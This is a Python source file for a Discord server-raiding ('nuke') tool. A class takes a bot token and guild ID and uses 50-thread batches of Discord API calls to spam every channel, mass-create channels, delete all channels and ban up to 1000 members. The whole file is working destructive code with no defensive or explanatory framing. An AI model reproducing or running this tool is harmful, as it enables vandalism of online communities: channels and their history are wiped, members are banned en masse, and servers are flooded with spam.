import requests
import threading


class Ray:
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = guild_id

    def __verify_token(self):
        """Function to verify the token."""
        url = "https://discord.com/api/v10/users/@me"
        headers = {"Authorization": f"Bot {self.token}"}
        req = requests.get(url=url, headers=headers)

        if req.status_code == 200:
            print("Token is valid :0")
            return True
        else:
            print("Either the token is invalid or your IP is blocked by Discord.")
            return False

    def __verify_guild(self):
        """Checks the guild ID."""
        url = f"https://discord.com/api/v10/guilds/{self.guild_id}"
        headers = {"Authorization": f"Bot {self.token}"}
        req = requests.get(url=url, headers=headers)

        if req.status_code == 200:
            print("Bot is present in the server. You are good to go.")
            return True
        else:
            print("Invalid guild ID or the bot is not in the guild. Add the bot to the guild and try again.")
            return False


    def spam_channels(self, count: int, message: str):
        """Spam all channels."""
        if not self.__verify_token() and not self.__verify_guild():
            return

        url = f"https://discord.com/api/v10/guilds/{self.guild_id}/channels"
        headers = {"Authorization": f"Bot {self.token}"}
        response = requests.get(url=url, headers=headers)

        if response.status_code != 200:
            print("Failed to fetch channels.")
            return

        channels = response.json()
        result_lock = threading.Lock()

        def spam(channel, count):
            try:
                for _ in range(count):
                    message_url = f"https://discord.com/api/v10/channels/{channel['id']}/messages"
                    payload = {"content": message}
                    msg_response = requests.post(url=message_url, headers=headers, json=payload)

                    with result_lock:
                        if msg_response.status_code == 200:
                            print(f"Message sent to channel {channel['id']} successfully.")
                        else:
                            print(f"Failed to send message to channel {channel['id']}")

            except Exception as e:
                with result_lock:
                    print(f"Error with channel {channel['id']}: {e}")

        threads = []
        for channel in channels:
            if len(threads) < 50:
                thread = threading.Thread(target=spam, args=(channel, count))
                threads.append(thread)
                thread.start()
            else:
                for t in threads:
                    t.join()
                threads = []

        for thread in threads:
            thread.join()

    def create_channels(self, num_channels: int, base_channel_name: str, reason: str = "rayuwu"):
        """Create a specified number of channels using threads."""
        if not self.__verify_token() and not self.__verify_guild():
            return

        url = f"https://discord.com/api/v10/guilds/{self.guild_id}/channels"
        headers = {"Authorization": f"Bot {self.token}"}
        result_lock = threading.Lock()

        def createchannel(channel_name):
            payload = {"name": channel_name, "type": 0, "reason": reason}

            try:
                response = requests.post(url, headers=headers, json=payload)
                with result_lock:
                    if response.status_code == 201:
                        print(f"Channel {channel_name} created successfully.")
                    else:
                        print(f"Failed to create channel {channel_name}")
            except Exception as e:
                with result_lock:
                    print(f"Error creating channel {channel_name}: {e}")

        threads = []
        for i in range(1, num_channels + 1):
            channel_name = f"{base_channel_name}_{i}"
            thread = threading.Thread(target=createchannel, args=(channel_name,))
            threads.append(thread)
            thread.start()

            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []

        for thread in threads:
            thread.join()

    def delete_channels(self):
        """Deletes all channels in the server using threads."""
        if not self.__verify_token() and not self.__verify_guild():
            return

        url = f"https://discord.com/api/v10/guilds/{self.guild_id}/channels"
        headers = {"Authorization": f"Bot {self.token}"}
        response = requests.get(url=url, headers=headers)

        if response.status_code != 200:
            print("Failed to fetch channels.")
            return

        channels = response.json()
        result_lock = threading.Lock()

        def delchannel(channel):
            try:
                delete_url = f"https://discord.com/api/v10/channels/{channel['id']}"
                delete_response = requests.delete(url=delete_url, headers=headers)

                with result_lock:
                    if delete_response.status_code == 204:
                        print(f"Channel {channel['id']} deleted successfully.")
                    else:
                        print(f"Failed to delete channel {channel['id']}")
            except Exception as e:
                with result_lock:
                    print(f"Error deleting channel {channel['id']}: {e}")

        threads = []
        for channel in channels:
            thread = threading.Thread(target=delchannel, args=(channel,))
            threads.append(thread)
            thread.start()

            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []

        for thread in threads:
            thread.join()

    def massban(self, reason: str = "rayuwu"):
        """Bans all members """
        if not self.__verify_token() and not self.__verify_guild():
            return

        url = f"https://discord.com/api/v10/guilds/{self.guild_id}/members?limit=1000"
        headers = {"Authorization": f"Bot {self.token}"}
        response = requests.get(url=url, headers=headers)

        if response.status_code != 200:
            print("Failed to fetch members.")
            return

        members = response.json()
        result_lock = threading.Lock()

        def ban(member):
            try:
                ban_url = f"https://discord.com/api/v10/guilds/{self.guild_id}/bans/{member['user']['id']}"
                payload = {"reason": reason}
                ban_response = requests.put(url=ban_url, headers=headers, json=payload)

                with result_lock:
                    if ban_response.status_code == 204:
                        print(f"Member {member['user']['id']} banned successfully.")
                    else:
                        print(f"Failed to ban member {member['user']['id']}")
            except Exception as e:
                with result_lock:
                    print(f"Error banning member {member['user']['id']}: {e}")

        threads = []
        for member in members:
            thread = threading.Thread(target=ban, args=(member,))
            threads.append(thread)
            thread.start()

            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []

        for thread in threads:
            thread.join()
